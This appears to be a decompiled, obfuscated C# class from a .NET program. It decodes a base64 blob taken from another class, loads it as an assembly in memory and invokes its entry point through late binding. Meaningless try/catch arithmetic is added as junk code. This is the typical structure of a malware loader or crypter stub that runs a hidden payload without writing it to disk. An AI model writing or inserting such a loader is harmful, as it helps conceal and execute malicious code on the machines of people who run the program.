using System;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using ns2;

namespace ns4;

internal sealed class Class5
{
	public unsafe static void smethod_0()
	{
		void* ptr = stackalloc byte[17];
		byte[] rawAssembly = Convert.FromBase64String(Class1.smethod_1().method_0().string_0);
		object obj = Assembly.Load(rawAssembly);
		NewLateBinding.LateCall(NewLateBinding.LateGet(obj, (Type)null, "EntryPoint", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Invoke", new object[2] { null, null }, (string[])null, (Type[])null, (bool[])null, true);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			*(double*)ptr = 86880050696.0;
			((byte*)ptr)[16] = ((*(double*)ptr == 86880050696.0) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[16] != 0)
			{
				*(double*)((byte*)ptr + 8) = 3369874129956321.0;
			}
			ProjectData.ClearProjectError();
		}
	}
}
